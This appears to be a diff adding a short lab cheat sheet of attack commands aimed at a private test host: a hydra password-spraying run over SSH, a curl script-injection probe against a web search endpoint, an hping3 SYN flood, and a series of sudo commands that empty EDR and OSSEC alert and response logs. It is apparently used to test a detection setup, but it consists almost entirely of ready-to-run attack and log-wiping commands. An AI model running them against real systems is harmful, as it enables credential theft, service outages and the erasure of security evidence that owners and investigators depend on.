@@ -1,0 +1,25 @@
+Password Spraying 
+(Kali)
+cd Desktop
+hydra -L userlist.txt -P passlist.txt -u ssh://192.168.6.4 -t 4 -V
+
+XSS
+(KALI)
+curl -i -G \
+  "http://192.168.6.4:3000/rest/products/search" \
+  --data-urlencode "q=<script>alert('XSS_TEST')</script>"
+
+SYN Flood
+(Kali)
+sudo hping3 -S --flood 192.168.6.4
+
+
+sudo truncate -s 0 /var/log/edr_evidence.jsonl
+sudo truncate -s 0 /var/ossec/logs/alerts/edr_alerts.json
+sudo truncate -s 0 /var/ossec/logs/alerts/edr_responses.log
+sudo truncate -s 0 /var/log/edr_os_alerts.jsonl
+sudo truncate -s 0 /var/log/edr_os_response_actions.jsonl
+sudo truncate -s 0 /var/log/edr_bruteforce_alerts.jsonl
+sudo truncate -s 0 /var/log/edr_bruteforce_response_actions.jsonl
+sudo truncate -s 0 /var/ossec/logs/injection-incidents.log
+sudo truncate -s 0 /var/log/edr_response_actions.log
